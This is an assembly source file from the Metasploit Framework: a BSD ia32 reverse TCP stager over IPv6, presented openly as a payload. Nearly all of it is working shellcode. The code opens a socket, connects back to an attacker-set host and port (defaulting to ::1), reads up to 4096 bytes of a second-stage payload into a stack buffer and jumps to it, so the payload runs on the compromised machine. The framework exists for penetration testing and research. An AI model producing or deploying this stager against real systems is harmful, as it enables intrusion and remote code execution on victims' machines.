;;
; 
;        Name: stager_sock_reverse_ipv6
;   Qualities: Can Have Nulls
;     Version: $Revision: 1626 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a BSD reverse TCP stager over IPv6
;
;        File descriptor in edi.
;
; Meta-Information:
;
; meta-shortname=BSD Reverse TCP Stager
; meta-description=Connect back to the framework and run a second stage
; meta-authors=skape <mmiller [at] hick.org>, vlad902 <vlad902 [at] gmail.com>, hdm <hdm [at] metasploit.com>
; meta-os=bsd
; meta-arch=ia32
; meta-category=stager
; meta-connection-type=reverse
; meta-name=reverse_tcp_ipv6
; meta-basemod=Msf::PayloadComponent::ReverseConnection
; meta-offset-lhost=43
; meta-offset-lport=36
; meta-offset-scope=59
;;
BITS   32
GLOBAL main

main:

socket:

	xor eax, eax
	push eax        ;   Protocol: (IP=0)
	inc eax
	push eax        ;       Type: (SOCK_STREAM=1)
	push byte 28    ;     Domain: (PF_INET6=28)

	push byte 97
	pop  eax        ; socket()
	push eax        ; padding
	int  0x80
	jmp short bounce_to_connect
	
connect:
	pop ecx
	push byte 28
	push ecx
	push eax

%ifdef FD_REG_EBX
	xchg eax, ebx
%else
	xchg eax, edi
%endif

	push byte 98
	pop  eax
	push eax ; padding
	int  0x80

	jmp short skip_bounce

bounce_to_connect:
	call connect
	
ipv6_address:
	db 28          ; uint8_t         sin6_len;       /* length of this struct */
	db 28          ; sa_family_t     sin6_family;    /* AF_INET6 */
	dw 0xbfbf      ; in_port_t       sin6_port;      /* Transport layer port # */
	dd 0           ; uint32_t        sin6_flowinfo;  /* IP6 flow information */
	dd 0           ; struct in6_addr sin6_addr;      /* IP6 address */
	dd 0
	dd 0
	dd 0x01000000  ; default to ::1
	dd 0           ; uint32_t        sin6_scope_id;  /* scope zone index */

skip_bounce:

%ifndef USE_SINGLE_STAGE

read:
	push byte 0x10
	pop edx
	shl edx, 8
	sub esp, edx
	mov ecx, esp ; Points to 4096 stack buffer
	
	push edx     ; Length
	push ecx     ; Buffer
	
%ifdef FD_REG_EBX
	push ebx     ; Socket
%else
	push edi     ; Socket
%endif	

	push ecx     ; Buffer to Return
	
	mov al, 0x3	
	int 0x80     ; read(socket, &buff, 4096)
	
	ret          ; Return

%endif
